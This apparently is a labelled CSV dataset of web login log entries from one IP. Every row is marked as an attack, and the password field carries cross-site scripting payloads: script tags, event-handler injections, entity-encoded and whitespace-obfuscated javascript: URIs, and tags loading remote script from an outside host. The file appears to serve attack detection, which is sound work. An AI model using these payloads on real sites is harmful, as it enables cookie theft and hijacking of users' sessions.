@@ -1,0 +1,453 @@
+,ip_address,date,hour,minute,seconds,protocol,username,password,status,respsize,timed,label
+0,192.108.116.88,18/Dec/2017,13,00,31,GET,datalab,"';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//;alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//--></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",200,1040,183,1
+1,192.108.116.88,18/Dec/2017,13,00,31,GET,datalab,"';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//;alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//--></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",200,945,35,1
+2,192.108.116.88,18/Dec/2017,13,00,31,GET,datalab,"';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//;alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//--></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",200,34463,8,1
+3,192.108.116.88,18/Dec/2017,13,02,31,POST,datalab,"';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//;alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//--></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",-,-,-,1
+4,192.108.116.88,18/Dec/2017,13,04,31,POST,datalab,"';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//;alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//--></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",-,-,-,1
+5,192.108.116.88,18/Dec/2017,13,04,56,GET,datalab,'';!--<XSS>=&{()},200,1040,19,1
+6,192.108.116.88,18/Dec/2017,13,04,56,GET,datalab,'';!--<XSS>=&{()},200,945,24,1
+7,192.108.116.88,18/Dec/2017,13,04,56,GET,datalab,'';!--<XSS>=&{()},200,34463,2,1
+8,192.108.116.88,18/Dec/2017,13,04,57,POST,datalab,'';!--<XSS>=&{()},200,1073,206,1
+9,192.108.116.88,18/Dec/2017,13,04,57,GET,datalab,'';!--<XSS>=&{()},304,-,5,1
+10,192.108.116.88,18/Dec/2017,13,04,57,GET,datalab,'';!--<XSS>=&{()},304,-,12,1
+11,192.108.116.88,18/Dec/2017,13,05,16,GET,datalab,"0\autofocus/onfocus=alert(1)--><video/poster/onerror=prompt(2)>""-confirm(3)-""",200,1040,19,1
+12,192.108.116.88,18/Dec/2017,13,05,16,GET,datalab,"0\autofocus/onfocus=alert(1)--><video/poster/onerror=prompt(2)>""-confirm(3)-""",200,945,4,1
+13,192.108.116.88,18/Dec/2017,13,05,16,GET,datalab,"0\autofocus/onfocus=alert(1)--><video/poster/onerror=prompt(2)>""-confirm(3)-""",200,34463,3,1
+14,192.108.116.88,18/Dec/2017,13,05,16,POST,datalab,"0\autofocus/onfocus=alert(1)--><video/poster/onerror=prompt(2)>""-confirm(3)-""",200,1073,139,1
+15,192.108.116.88,18/Dec/2017,13,05,16,GET,datalab,"0\autofocus/onfocus=alert(1)--><video/poster/onerror=prompt(2)>""-confirm(3)-""",304,-,4,1
+16,192.108.116.88,18/Dec/2017,13,05,16,GET,datalab,"0\autofocus/onfocus=alert(1)--><video/poster/onerror=prompt(2)>""-confirm(3)-""",304,-,9,1
+17,192.108.116.88,18/Dec/2017,13,05,38,GET,datalab,"<script/src=data:,alert()>",200,1040,,1
+18,192.108.116.88,18/Dec/2017,13,05,38,GET,datalab,"<script/src=data:,alert()>",200,945,,1
+19,192.108.116.88,18/Dec/2017,13,05,38,GET,datalab,"<script/src=data:,alert()>",200,34463,,1
+20,192.108.116.88,18/Dec/2017,13,05,39,POST,datalab,"<script/src=data:,alert()>",200,1073,,1
+21,192.108.116.88,18/Dec/2017,13,05,39,GET,datalab,"<script/src=data:,alert()>",304,-,,1
+22,192.108.116.88,18/Dec/2017,13,05,39,GET,datalab,"<script/src=data:,alert()>",304,-,,1
+23,192.108.116.88,18/Dec/2017,13,06,03,GET,datalab,<marquee/onstart=alert()>,200,1040,,1
+24,192.108.116.88,18/Dec/2017,13,06,03,GET,datalab,<marquee/onstart=alert()>,200,945,,1
+25,192.108.116.88,18/Dec/2017,13,06,03,GET,datalab,<marquee/onstart=alert()>,200,34463,,1
+26,192.108.116.88,18/Dec/2017,13,06,03,POST,datalab,<marquee/onstart=alert()>,200,1073,,1
+27,192.108.116.88,18/Dec/2017,13,06,04,GET,datalab,<marquee/onstart=alert()>,304,-,,1
+28,192.108.116.88,18/Dec/2017,13,06,04,GET,datalab,<marquee/onstart=alert()>,304,-,,1
+29,192.108.116.88,18/Dec/2017,13,06,26,GET,datalab,<video/poster/onerror=alert()>,200,1040,,1
+30,192.108.116.88,18/Dec/2017,13,06,26,GET,datalab,<video/poster/onerror=alert()>,200,945,,1
+31,192.108.116.88,18/Dec/2017,13,06,26,GET,datalab,<video/poster/onerror=alert()>,200,34463,,1
+32,192.108.116.88,18/Dec/2017,13,06,27,POST,datalab,<video/poster/onerror=alert()>,200,1073,,1
+33,192.108.116.88,18/Dec/2017,13,06,27,GET,datalab,<video/poster/onerror=alert()>,304,-,,1
+34,192.108.116.88,18/Dec/2017,13,06,27,GET,datalab,<video/poster/onerror=alert()>,304,-,,1
+35,192.108.116.88,18/Dec/2017,13,06,45,GET,datalab,<isindex/autofocus/onfocus=alert()>,200,1040,,1
+36,192.108.116.88,18/Dec/2017,13,06,45,GET,datalab,<isindex/autofocus/onfocus=alert()>,200,945,,1
+37,192.108.116.88,18/Dec/2017,13,06,45,GET,datalab,<isindex/autofocus/onfocus=alert()>,200,34463,,1
+38,192.108.116.88,18/Dec/2017,13,06,46,POST,datalab,<isindex/autofocus/onfocus=alert()>,200,1073,,1
+39,192.108.116.88,18/Dec/2017,13,06,46,GET,datalab,<isindex/autofocus/onfocus=alert()>,304,-,,1
+40,192.108.116.88,18/Dec/2017,13,06,46,GET,datalab,<isindex/autofocus/onfocus=alert()>,304,-,,1
+41,192.108.116.88,18/Dec/2017,13,07,06,GET,datalab,<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>,200,1040,,1
+42,192.108.116.88,18/Dec/2017,13,07,06,GET,datalab,<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>,200,945,,1
+43,192.108.116.88,18/Dec/2017,13,07,06,GET,datalab,<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>,200,34463,,1
+44,192.108.116.88,18/Dec/2017,13,07,07,POST,datalab,<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>,200,1073,,1
+45,192.108.116.88,18/Dec/2017,13,07,07,GET,datalab,<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>,304,-,,1
+46,192.108.116.88,18/Dec/2017,13,07,07,GET,datalab,<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>,304,-,,1
+47,192.108.116.88,18/Dec/2017,13,07,24,GET,datalab,"<IMG SRC=javascript:alert('XSS');"">",200,1040,2,1
+48,192.108.116.88,18/Dec/2017,13,07,24,GET,datalab,"<IMG SRC=javascript:alert('XSS');"">",200,945,1,1
+49,192.108.116.88,18/Dec/2017,13,07,24,GET,datalab,"<IMG SRC=javascript:alert('XSS');"">",200,34463,1,1
+50,192.108.116.88,18/Dec/2017,13,09,24,POST,datalab,"<IMG SRC=javascript:alert('XSS');"">",-,-,-,1
+51,192.108.116.88,18/Dec/2017,13,11,25,POST,datalab,"<IMG SRC=javascript:alert('XSS');"">",-,-,-,1
+52,192.108.116.88,18/Dec/2017,13,11,47,GET,datalab,<IMG SRC=javascript:alert('XSS')>,200,1040,,1
+53,192.108.116.88,18/Dec/2017,13,11,47,GET,datalab,<IMG SRC=javascript:alert('XSS')>,200,945,,1
+54,192.108.116.88,18/Dec/2017,13,11,47,GET,datalab,<IMG SRC=javascript:alert('XSS')>,200,34463,,1
+55,192.108.116.88,18/Dec/2017,13,13,47,POST,datalab,<IMG SRC=javascript:alert('XSS')>,-,-,,1
+56,192.108.116.88,18/Dec/2017,13,15,48,POST,datalab,<IMG SRC=javascript:alert('XSS')>,-,-,,1
+57,192.108.116.88,18/Dec/2017,13,32,21,GET,datalab,"<IMG SRC=javascript:alert('XSS');"">",200,1040,55,1
+58,192.108.116.88,18/Dec/2017,13,32,21,GET,datalab,"<IMG SRC=javascript:alert('XSS');"">",200,945,65,1
+59,192.108.116.88,18/Dec/2017,13,32,21,GET,datalab,"<IMG SRC=javascript:alert('XSS');"">",200,34463,59,1
+60,192.108.116.88,18/Dec/2017,13,34,21,POST,datalab,"<IMG SRC=javascript:alert('XSS');"">",-,-,-,1
+61,192.108.116.88,18/Dec/2017,13,36,21,POST,datalab,"<IMG SRC=javascript:alert('XSS');"">",-,-,-,1
+62,192.108.116.88,18/Dec/2017,13,36,46,GET,datalab,<IMG SRC=javascript:alert('XSS')>,200,1040,,1
+63,192.108.116.88,18/Dec/2017,13,36,46,GET,datalab,<IMG SRC=javascript:alert('XSS')>,200,945,,1
+64,192.108.116.88,18/Dec/2017,13,36,47,GET,datalab,<IMG SRC=javascript:alert('XSS')>,200,34463,,1
+65,192.108.116.88,18/Dec/2017,13,38,46,POST,datalab,<IMG SRC=javascript:alert('XSS')>,-,-,,1
+66,192.108.116.88,18/Dec/2017,13,40,46,POST,datalab,<IMG SRC=javascript:alert('XSS')>,-,-,,1
+67,192.108.116.88,18/Dec/2017,13,41,11,GET,datalab,<IMG SRC=JaVaScRiPt:alert('XSS')>,200,1040,,1
+68,192.108.116.88,18/Dec/2017,13,41,11,GET,datalab,<IMG SRC=JaVaScRiPt:alert('XSS')>,200,945,,1
+69,192.108.116.88,18/Dec/2017,13,41,11,GET,datalab,<IMG SRC=JaVaScRiPt:alert('XSS')>,200,34463,,1
+70,192.108.116.88,18/Dec/2017,13,43,11,POST,datalab,<IMG SRC=JaVaScRiPt:alert('XSS')>,-,-,,1
+71,192.108.116.88,18/Dec/2017,13,45,11,POST,datalab,<IMG SRC=JaVaScRiPt:alert('XSS')>,-,-,,1
+72,192.108.116.88,18/Dec/2017,13,45,26,GET,datalab,"<IMG SRC=javascript:alert(XSS"")>",200,1040,49,1
+73,192.108.116.88,18/Dec/2017,13,45,27,GET,datalab,"<IMG SRC=javascript:alert(XSS"")>",200,945,4,1
+74,192.108.116.88,18/Dec/2017,13,45,27,GET,datalab,"<IMG SRC=javascript:alert(XSS"")>",200,34463,10,1
+75,192.108.116.88,18/Dec/2017,13,45,28,POST,datalab,"<IMG SRC=javascript:alert(XSS"")>",200,1073,224,1
+76,192.108.116.88,18/Dec/2017,13,45,28,GET,datalab,"<IMG SRC=javascript:alert(XSS"")>",304,-,2,1
+77,192.108.116.88,18/Dec/2017,13,45,28,GET,datalab,"<IMG SRC=javascript:alert(XSS"")>",304,-,24,1
+78,192.108.116.88,18/Dec/2017,13,50,27,GET,datalab,<a onmouseover=alert(document.cookie)>xxs link</a>,200,1040,,1
+79,192.108.116.88,18/Dec/2017,13,50,27,GET,datalab,<a onmouseover=alert(document.cookie)>xxs link</a>,200,945,,1
+80,192.108.116.88,18/Dec/2017,13,50,27,GET,datalab,<a onmouseover=alert(document.cookie)>xxs link</a>,200,34463,,1
+81,192.108.116.88,18/Dec/2017,13,50,28,POST,datalab,<a onmouseover=alert(document.cookie)>xxs link</a>,200,1073,,1
+82,192.108.116.88,18/Dec/2017,13,50,28,GET,datalab,<a onmouseover=alert(document.cookie)>xxs link</a>,304,-,,1
+83,192.108.116.88,18/Dec/2017,13,50,28,GET,datalab,<a onmouseover=alert(document.cookie)>xxs link</a>,304,-,,1
+84,192.108.116.88,18/Dec/2017,13,50,44,GET,datalab,"<IMG ""><SCRIPT>alert(""XSS"")</SCRIPT>"">",200,1040,221,1
+85,192.108.116.88,18/Dec/2017,13,50,44,GET,datalab,"<IMG ""><SCRIPT>alert(""XSS"")</SCRIPT>"">",200,945,97,1
+86,192.108.116.88,18/Dec/2017,13,50,44,GET,datalab,"<IMG ""><SCRIPT>alert(""XSS"")</SCRIPT>"">",200,34463,74,1
+87,192.108.116.88,18/Dec/2017,13,50,45,POST,datalab,"<IMG ""><SCRIPT>alert(""XSS"")</SCRIPT>"">",200,1073,133,1
+88,192.108.116.88,18/Dec/2017,13,50,45,GET,datalab,"<IMG ""><SCRIPT>alert(""XSS"")</SCRIPT>"">",304,-,1,1
+89,192.108.116.88,18/Dec/2017,13,50,45,GET,datalab,"<IMG ""><SCRIPT>alert(""XSS"")</SCRIPT>"">",304,-,1,1
+90,192.108.116.88,18/Dec/2017,13,51,05,GET,datalab,"<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",200,1040,,1
+91,192.108.116.88,18/Dec/2017,13,51,05,GET,datalab,"<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",200,945,,1
+92,192.108.116.88,18/Dec/2017,13,51,05,GET,datalab,"<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",200,34463,,1
+93,192.108.116.88,18/Dec/2017,13,51,06,POST,datalab,"<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",200,1073,,1
+94,192.108.116.88,18/Dec/2017,13,51,06,GET,datalab,"<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",304,-,,1
+95,192.108.116.88,18/Dec/2017,13,51,06,GET,datalab,"<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",304,-,,1
+96,192.108.116.88,18/Dec/2017,13,51,26,GET,datalab,"<IMG SRC=# onmouseover=alert('xxs')"">",200,1040,43,1
+97,192.108.116.88,18/Dec/2017,13,51,27,GET,datalab,"<IMG SRC=# onmouseover=alert('xxs')"">",200,945,99,1
+98,192.108.116.88,18/Dec/2017,13,51,27,GET,datalab,"<IMG SRC=# onmouseover=alert('xxs')"">",200,34463,14,1
+99,192.108.116.88,18/Dec/2017,13,53,27,POST,datalab,"<IMG SRC=# onmouseover=alert('xxs')"">",-,-,-,1
+100,192.108.116.88,18/Dec/2017,13,55,27,POST,datalab,"<IMG SRC=# onmouseover=alert('xxs')"">",-,-,-,1
+101,192.108.116.88,18/Dec/2017,13,55,41,GET,datalab,"<IMG SRC= onmouseover=alert('xxs')"">",200,1040,39,1
+102,192.108.116.88,18/Dec/2017,13,55,41,GET,datalab,"<IMG SRC= onmouseover=alert('xxs')"">",200,945,7,1
+103,192.108.116.88,18/Dec/2017,13,55,42,GET,datalab,"<IMG SRC= onmouseover=alert('xxs')"">",200,34463,10,1
+104,192.108.116.88,18/Dec/2017,13,57,41,POST,datalab,"<IMG SRC= onmouseover=alert('xxs')"">",-,-,-,1
+105,192.108.116.88,18/Dec/2017,13,59,42,POST,datalab,"<IMG SRC= onmouseover=alert('xxs')"">",-,-,-,1
+106,192.108.116.88,18/Dec/2017,13,59,57,GET,datalab,"<IMG onmouseover=alert('xxs')"">",200,1040,14,1
+107,192.108.116.88,18/Dec/2017,13,59,57,GET,datalab,"<IMG onmouseover=alert('xxs')"">",200,945,3,1
+108,192.108.116.88,18/Dec/2017,13,59,58,GET,datalab,"<IMG onmouseover=alert('xxs')"">",200,34463,3,1
+109,192.108.116.88,18/Dec/2017,14,01,57,POST,datalab,"<IMG onmouseover=alert('xxs')"">",-,-,-,1
+110,192.108.116.88,18/Dec/2017,14,03,58,POST,datalab,"<IMG onmouseover=alert('xxs')"">",-,-,-,1
+111,192.108.116.88,18/Dec/2017,14,04,14,GET,datalab,"<IMG SRC=/ onerror=alert(String.fromCharCode(88,83,83))""></img>",200,1040,35,1
+112,192.108.116.88,18/Dec/2017,14,04,15,GET,datalab,"<IMG SRC=/ onerror=alert(String.fromCharCode(88,83,83))""></img>",200,945,55,1
+113,192.108.116.88,18/Dec/2017,14,04,15,GET,datalab,"<IMG SRC=/ onerror=alert(String.fromCharCode(88,83,83))""></img>",200,34463,4,1
+114,192.108.116.88,18/Dec/2017,14,04,15,POST,datalab,"<IMG SRC=/ onerror=alert(String.fromCharCode(88,83,83))""></img>",200,1073,171,1
+115,192.108.116.88,18/Dec/2017,14,04,16,GET,datalab,"<IMG SRC=/ onerror=alert(String.fromCharCode(88,83,83))""></img>",304,-,2,1
+116,192.108.116.88,18/Dec/2017,14,04,16,GET,datalab,"<IMG SRC=/ onerror=alert(String.fromCharCode(88,83,83))""></img>",304,-,12,1
+117,192.108.116.88,18/Dec/2017,14,04,41,GET,datalab,<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;,200,1040,,1
+118,192.108.116.88,18/Dec/2017,14,04,41,GET,datalab,<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;,200,945,,1
+119,192.108.116.88,18/Dec/2017,14,04,41,GET,datalab,<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;,200,34463,,1
+120,192.108.116.88,18/Dec/2017,14,04,42,POST,datalab,<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;,200,1073,,1
+121,192.108.116.88,18/Dec/2017,14,04,42,GET,datalab,<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;,304,-,,1
+122,192.108.116.88,18/Dec/2017,14,04,42,GET,datalab,<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;,304,-,,1
+123,192.108.116.88,18/Dec/2017,14,04,57,GET,datalab,&#39;&#88;&#83;&#83;&#39;&#41;>,200,1040,,1
+124,192.108.116.88,18/Dec/2017,14,04,57,GET,datalab,&#39;&#88;&#83;&#83;&#39;&#41;>,200,945,,1
+125,192.108.116.88,18/Dec/2017,14,04,57,GET,datalab,&#39;&#88;&#83;&#83;&#39;&#41;>,200,34463,,1
+126,192.108.116.88,18/Dec/2017,14,04,58,POST,datalab,&#39;&#88;&#83;&#83;&#39;&#41;>,200,1073,,1
+127,192.108.116.88,18/Dec/2017,14,04,58,GET,datalab,&#39;&#88;&#83;&#83;&#39;&#41;>,304,-,,1
+128,192.108.116.88,18/Dec/2017,14,04,58,GET,datalab,&#39;&#88;&#83;&#83;&#39;&#41;>,304,-,,1
+129,192.108.116.88,18/Dec/2017,14,05,17,GET,datalab,<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&,200,1040,,1
+130,192.108.116.88,18/Dec/2017,14,05,17,GET,datalab,<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&,200,945,,1
+131,192.108.116.88,18/Dec/2017,14,05,17,GET,datalab,<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&,200,34463,,1
+132,192.108.116.88,18/Dec/2017,14,05,18,POST,datalab,<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&,200,1073,,1
+133,192.108.116.88,18/Dec/2017,14,05,19,GET,datalab,<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&,304,-,,1
+134,192.108.116.88,18/Dec/2017,14,05,19,GET,datalab,<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&,304,-,,1
+135,192.108.116.88,18/Dec/2017,14,05,37,GET,datalab,#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>,200,1040,,1
+136,192.108.116.88,18/Dec/2017,14,05,37,GET,datalab,#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>,200,945,,1
+137,192.108.116.88,18/Dec/2017,14,05,37,GET,datalab,#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>,200,34463,,1
+138,192.108.116.88,18/Dec/2017,14,05,38,POST,datalab,#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>,200,1073,,1
+139,192.108.116.88,18/Dec/2017,14,05,38,GET,datalab,#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>,304,-,,1
+140,192.108.116.88,18/Dec/2017,14,05,38,GET,datalab,#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>,304,-,,1
+141,192.108.116.88,18/Dec/2017,14,06,03,GET,datalab,<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>,200,1040,,1
+142,192.108.116.88,18/Dec/2017,14,06,03,GET,datalab,<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>,200,945,,1
+143,192.108.116.88,18/Dec/2017,14,06,03,GET,datalab,<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>,200,34463,,1
+144,192.108.116.88,18/Dec/2017,14,06,04,POST,datalab,<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>,200,1073,,1
+145,192.108.116.88,18/Dec/2017,14,06,04,GET,datalab,<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>,304,-,,1
+146,192.108.116.88,18/Dec/2017,14,06,04,GET,datalab,<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>,304,-,,1
+147,192.108.116.88,18/Dec/2017,14,06,31,GET,datalab,"<IMG SRC=jav	ascript:alert('XSS');"">",200,1040,1,1
+148,192.108.116.88,18/Dec/2017,14,06,31,GET,datalab,"<IMG SRC=jav	ascript:alert('XSS');"">",200,945,1,1
+149,192.108.116.88,18/Dec/2017,14,06,31,GET,datalab,"<IMG SRC=jav	ascript:alert('XSS');"">",200,34463,2,1
+150,192.108.116.88,18/Dec/2017,14,06,32,POST,datalab,"<IMG SRC=jav	ascript:alert('XSS');"">",200,1073,167,1
+151,192.108.116.88,18/Dec/2017,14,06,33,GET,datalab,"<IMG SRC=jav	ascript:alert('XSS');"">",304,-,0,1
+152,192.108.116.88,18/Dec/2017,14,06,33,GET,datalab,"<IMG SRC=jav	ascript:alert('XSS');"">",304,-,0,1
+153,192.108.116.88,18/Dec/2017,14,06,57,GET,datalab,"<IMG SRC=jav&#x09;ascript:alert('XSS');"">",200,1040,12,1
+154,192.108.116.88,18/Dec/2017,14,06,57,GET,datalab,"<IMG SRC=jav&#x09;ascript:alert('XSS');"">",200,945,6,1
+155,192.108.116.88,18/Dec/2017,14,06,57,GET,datalab,"<IMG SRC=jav&#x09;ascript:alert('XSS');"">",200,34463,4,1
+156,192.108.116.88,18/Dec/2017,14,08,57,POST,datalab,"<IMG SRC=jav&#x09;ascript:alert('XSS');"">",-,-,-,1
+157,192.108.116.88,18/Dec/2017,14,10,58,POST,datalab,"<IMG SRC=jav&#x09;ascript:alert('XSS');"">",-,-,-,1
+158,192.108.116.88,18/Dec/2017,14,11,17,GET,datalab,"<IMG SRC=jav&#x0A;ascript:alert('XSS');"">",200,1040,3,1
+159,192.108.116.88,18/Dec/2017,14,11,17,GET,datalab,"<IMG SRC=jav&#x0A;ascript:alert('XSS');"">",200,945,12,1
+160,192.108.116.88,18/Dec/2017,14,11,17,GET,datalab,"<IMG SRC=jav&#x0A;ascript:alert('XSS');"">",200,34463,1,1
+161,192.108.116.88,18/Dec/2017,14,13,17,POST,datalab,"<IMG SRC=jav&#x0A;ascript:alert('XSS');"">",-,-,-,1
+162,192.108.116.88,18/Dec/2017,14,15,17,POST,datalab,"<IMG SRC=jav&#x0A;ascript:alert('XSS');"">",-,-,-,1
+163,192.108.116.88,18/Dec/2017,14,15,36,GET,datalab,"<IMG SRC=jav&#x0D;ascript:alert('XSS');"">",200,1040,27,1
+164,192.108.116.88,18/Dec/2017,14,15,36,GET,datalab,"<IMG SRC=jav&#x0D;ascript:alert('XSS');"">",200,945,22,1
+165,192.108.116.88,18/Dec/2017,14,15,36,GET,datalab,"<IMG SRC=jav&#x0D;ascript:alert('XSS');"">",200,34463,3,1
+166,192.108.116.88,18/Dec/2017,14,17,36,POST,datalab,"<IMG SRC=jav&#x0D;ascript:alert('XSS');"">",-,-,-,1
+167,192.108.116.88,18/Dec/2017,14,19,36,POST,datalab,"<IMG SRC=jav&#x0D;ascript:alert('XSS');"">",-,-,-,1
+168,192.108.116.88,18/Dec/2017,14,24,13,GET,datalab,"<SCRIPT/XSS SRC=http://ha.ckers.org/xss.js""></SCRIPT>",200,1040,31,1
+169,192.108.116.88,18/Dec/2017,14,24,13,GET,datalab,"<SCRIPT/XSS SRC=http://ha.ckers.org/xss.js""></SCRIPT>",200,945,41,1
+170,192.108.116.88,18/Dec/2017,14,24,13,GET,datalab,"<SCRIPT/XSS SRC=http://ha.ckers.org/xss.js""></SCRIPT>",200,34463,13,1
+171,192.108.116.88,18/Dec/2017,14,24,14,POST,datalab,"<SCRIPT/XSS SRC=http://ha.ckers.org/xss.js""></SCRIPT>",200,1073,218,1
+172,192.108.116.88,18/Dec/2017,14,24,14,GET,datalab,"<SCRIPT/XSS SRC=http://ha.ckers.org/xss.js""></SCRIPT>",304,-,5,1
+173,192.108.116.88,18/Dec/2017,14,24,14,GET,datalab,"<SCRIPT/XSS SRC=http://ha.ckers.org/xss.js""></SCRIPT>",304,-,5,1
+174,192.108.116.88,18/Dec/2017,14,24,33,GET,datalab,"<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(XSS"")>",200,1040,1,1
+175,192.108.116.88,18/Dec/2017,14,24,33,GET,datalab,"<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(XSS"")>",200,945,17,1
+176,192.108.116.88,18/Dec/2017,14,24,33,GET,datalab,"<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(XSS"")>",200,34463,3,1
+177,192.108.116.88,18/Dec/2017,14,24,34,POST,datalab,"<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(XSS"")>",200,1073,158,1
+178,192.108.116.88,18/Dec/2017,14,24,34,GET,datalab,"<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(XSS"")>",304,-,1,1
+179,192.108.116.88,18/Dec/2017,14,24,34,GET,datalab,"<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(XSS"")>",304,-,10,1
+180,192.108.116.88,18/Dec/2017,14,24,50,GET,datalab,"<SCRIPT/SRC=http://ha.ckers.org/xss.js""></SCRIPT>",200,1040,4,1
+181,192.108.116.88,18/Dec/2017,14,24,50,GET,datalab,"<SCRIPT/SRC=http://ha.ckers.org/xss.js""></SCRIPT>",200,945,1,1
+182,192.108.116.88,18/Dec/2017,14,24,50,GET,datalab,"<SCRIPT/SRC=http://ha.ckers.org/xss.js""></SCRIPT>",200,34463,1,1
+183,192.108.116.88,18/Dec/2017,14,24,51,POST,datalab,"<SCRIPT/SRC=http://ha.ckers.org/xss.js""></SCRIPT>",200,1073,172,1
+184,192.108.116.88,18/Dec/2017,14,24,51,GET,datalab,"<SCRIPT/SRC=http://ha.ckers.org/xss.js""></SCRIPT>",304,-,0,1
+185,192.108.116.88,18/Dec/2017,14,24,51,GET,datalab,"<SCRIPT/SRC=http://ha.ckers.org/xss.js""></SCRIPT>",304,-,2,1
+186,192.108.116.88,18/Dec/2017,14,25,10,GET,datalab,"<<SCRIPT>alert(XSS"");//<</SCRIPT>",200,1040,0,1
+187,192.108.116.88,18/Dec/2017,14,25,10,GET,datalab,"<<SCRIPT>alert(XSS"");//<</SCRIPT>",200,945,0,1
+188,192.108.116.88,18/Dec/2017,14,25,10,GET,datalab,"<<SCRIPT>alert(XSS"");//<</SCRIPT>",200,34463,6,1
+189,192.108.116.88,18/Dec/2017,14,25,11,POST,datalab,"<<SCRIPT>alert(XSS"");//<</SCRIPT>",200,1073,126,1
+190,192.108.116.88,18/Dec/2017,14,25,11,GET,datalab,"<<SCRIPT>alert(XSS"");//<</SCRIPT>",304,-,0,1
+191,192.108.116.88,18/Dec/2017,14,25,11,GET,datalab,"<<SCRIPT>alert(XSS"");//<</SCRIPT>",304,-,0,1
+192,192.108.116.88,18/Dec/2017,14,25,27,GET,datalab,<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >,200,1040,,1
